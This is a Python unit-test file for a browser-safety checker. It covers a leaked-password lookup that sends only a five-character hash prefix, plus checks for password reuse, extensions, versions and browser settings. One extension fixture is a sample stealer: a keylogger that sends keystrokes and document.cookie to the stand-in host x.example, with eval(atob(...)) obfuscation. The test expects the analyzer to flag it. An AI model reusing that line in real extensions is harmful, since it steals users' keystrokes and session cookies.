import os, sys, unittest
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))
import sps_safety as S


class PwnedTests(unittest.TestCase):
    def test_known_sha1_vector(self):
        self.assertEqual(S.sha1_parts("password"), ("5BAA6", "1E4C9B93F3F0682250B6CF8331B7EE68FD8"))

    def test_only_five_chars_leave_the_computer(self):
        asked = []
        def fake(url):
            asked.append(url)
            return "0018A45C4D1DEF81644B54AB7F969B88D65:3\r\n1E4C9B93F3F0682250B6CF8331B7EE68FD8:9545824\r\n00D4F6E8FA6EECAD2A3AA415EEC418D38EC:0"
        self.assertEqual(S.pwned_count("password", fake), 9545824)
        self.assertEqual(asked, [S.HIBP_RANGE + "5BAA6"])
        self.assertNotIn("1E4C9B93F3F0", asked[0]); self.assertEqual(asked[0].rsplit("/", 1)[1], "5BAA6")
        self.assertEqual(S.pwned_count("password", lambda u: "AAAA:1"), 0)

    def test_padding_rows_with_zero_count_are_not_matches(self):
        self.assertEqual(S.pwned_count("password", lambda u: "1E4C9B93F3F0682250B6CF8331B7EE68FD8:0"), 0)

    def test_check_passwords(self):
        entries = [{"site": "a.com", "password": "password"}, {"site": "b.com", "password": "Xk9#vLq2!pZr"},
                   {"site": "c.com", "password": "Reused!Pass99"}, {"site": "d.com", "password": "Reused!Pass99"}, {"site": "e.com", "password": "abc"}]
        fake = lambda u: "1E4C9B93F3F0682250B6CF8331B7EE68FD8:5" if u.endswith("5BAA6") else ""
        res, ok = S.check_passwords(entries, fake)
        kinds = [r[1] for r in res]
        self.assertTrue(ok)
        self.assertIn("Password found in a data leak", kinds); self.assertIn("Reused password", kinds); self.assertIn("Weak password", kinds)
        self.assertEqual([r for r in res if r[0] == S.BAD][0][1], "Password found in a data leak")
        self.assertFalse(any("Xk9" in r[2] for r in res))                  # passwords never appear in the report

    def test_network_failure_is_reported_not_raised(self):
        def boom(u): raise OSError("offline")
        res, ok = S.check_passwords([{"site": "a.com", "password": "Xk9#vLq2!pZr"}], boom)
        self.assertFalse(ok); self.assertEqual(res[0][0], S.INFO)

    def test_no_passwords(self):
        res, ok = S.check_passwords([], None); self.assertEqual(res[0][0], S.INFO)


class ExtensionTests(unittest.TestCase):
    def test_benign(self):
        lvl, why = S.analyze_extension({"name": "dark", "match": "*://example.com/*", "code": "document.body.style.background='#111'"})
        self.assertEqual(lvl, S.OK)

    def test_stealer(self):
        code = "document.addEventListener('keydown',e=>fetch('https://x.example/k?'+e.key+document.cookie)); eval(atob('YWxlcnQoMSk='))"
        lvl, why = S.analyze_extension({"name": "x", "match": "*", "code": code})
        self.assertEqual(lvl, S.BAD); self.assertTrue(any("AND send" in w for w in why))

    def test_disabled_ignored_and_report(self):
        r = S.check_extensions([{"name": "bad", "enabled": False, "match": "*", "code": "eval(document.cookie);fetch('x')"}], [])
        self.assertEqual(r[0][0], S.OK)
        r = S.check_extensions([], [{"name": "bad", "match": "*", "code": "eval(document.cookie);fetch('x');atob('a')"}])
        self.assertIn(r[0][0], (S.WARN, S.BAD))


class VersionSettingsTests(unittest.TestCase):
    def test_version(self):
        r = S.check_version("1.0", lambda: "page", lambda p, v: {"version": "2.0"}); self.assertEqual(r[0][0], S.WARN)
        r = S.check_version("2.0", lambda: "page", lambda p, v: None); self.assertEqual(r[0][0], S.OK)
        def boom(): raise OSError()
        self.assertEqual(S.check_version("1", boom, None)[0][0], S.INFO)

    def test_settings(self):
        r = S.check_settings({"ad_blocker": True, "https_only": False, "tracking_protection": True})
        by = {x[1]: x[0] for x in r}
        self.assertEqual(by["Ad blocker"], S.OK); self.assertEqual(by["HTTPS-only mode"], S.WARN)

    def test_run_all(self):
        out = S.run_all(passwords=[], extensions=[], scripts=[], settings={}, current_version="1", fetch_page=lambda: "", best_valid_update=lambda p, v: None)
        self.assertTrue(len(out) >= 3)


if __name__ == "__main__":
    unittest.main()
